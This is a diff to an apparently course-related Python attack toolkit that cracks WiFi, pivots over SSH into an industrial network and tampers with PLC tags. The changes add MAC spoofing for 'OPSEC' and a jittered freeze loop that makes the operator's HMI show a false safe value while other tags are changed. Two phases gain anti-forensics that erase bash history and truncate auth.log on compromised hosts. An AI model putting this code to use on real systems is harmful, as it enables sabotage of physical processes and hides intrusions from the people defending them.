@@ -6,6 +6,7 @@ import sys
 import os
 import io
 import re
+import random
 import threading
 import time
 import json
@@ -49,6 +50,7 @@ CFG = {
     "wifi": {
         "interface":    "wlan0",
         "monitor_iface":"wlan0",
+        "ssid":         "HemoLock",
         "wordlist":     "/usr/share/wordlists/rockyou.txt",
         "capture_file": "/tmp/incs4810_capture",
     },
@@ -445,7 +447,7 @@ def auto_route(subnets: list[str]):
 
 def preflight_check():
     """Verify required system tools are installed before running any phase."""
-    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng"]
+    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng", "macchanger"]
     missing = []
     for tool in tools:
         rc, _ = run_cmd(f"which {tool}", capture=False)
@@ -520,9 +522,13 @@ def phase1_wifi_crack() -> PhaseResult:
         run_cmd(f"sudo ifconfig {iface} up",           capture=False)
 
     try:
+        # ── MAC randomisation (OPSEC) ─────────────────────────────────────────
+        ok(f"Randomising MAC address on {iface}...")
+        run_cmd(f"sudo ifconfig {iface} down",    capture=False)
+        run_cmd(f"sudo macchanger -r {iface}",    capture=False)
+
         # ── Monitor mode ──────────────────────────────────────────────────────
         ok(f"Putting {iface} into monitor mode...")
-        run_cmd(f"sudo ifconfig {iface} down",          capture=False)
         run_cmd(f"sudo iwconfig {iface} mode monitor",  capture=False)
         run_cmd(f"sudo ifconfig {iface} up",            capture=False)
 
@@ -1206,6 +1212,16 @@ def phase4_ssh_pivot() -> PhaseResult:
 
         findings.append(f"OT Sweep:\n{sweep_out}")
 
+        # ── Anti-forensics: wipe bash history + auth.log on remote hosts ─────
+        for af_client in (ids_client, hist_client):
+            try:
+                ssh_run(af_client,
+                        "cat /dev/null > ~/.bash_history; "
+                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
+                        timeout=5)
+            except Exception:
+                pass
+
         ids_client.close()
         hist_client.close()
 
@@ -1478,14 +1494,14 @@ def phase5_plc_attack() -> PhaseResult:
                                         plc_conn.write((tag_name, val))
                                 except Exception:
                                     pass
-                                time.sleep(0.005)
+                                time.sleep(random.uniform(0.003, 0.008))
 
                         t = threading.Thread(target=_freeze_loop, daemon=True)
                         t.start()
                         console.print(Panel(
                             f"[bold white]Frozen tag :[/bold white] [bold yellow]{freeze_tag}[/bold yellow]\n"
                             f"[bold white]Locked at  :[/bold white] [bold green]{safe_value}[/bold green]\n"
-                            f"[bold white]Interval   :[/bold white] 5 ms (Overclocked)\n\n"
+                            f"[bold white]Interval   :[/bold white] 3–8 ms (Randomized Jitter)\n\n"
                             f"[dim]HMI will display {safe_value} while you manipulate other tags[/dim]",
                             title="[bold magenta] HMI STEALTH MODE ACTIVE [/bold magenta]",
                             border_style="magenta", expand=False,
@@ -1607,6 +1623,17 @@ def phase6_defense_check() -> PhaseResult:
         )
 
         stdout, _, _ = ssh_run(ids_client, ids_cmd)
+
+        # ── Anti-forensics: wipe bash history + auth.log on remote hosts ─────
+        for af_client in (ids_client, hist_client):
+            try:
+                ssh_run(af_client,
+                        "cat /dev/null > ~/.bash_history; "
+                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
+                        timeout=5)
+            except Exception:
+                pass
+
         ids_client.close()
         hist_client.close()
 
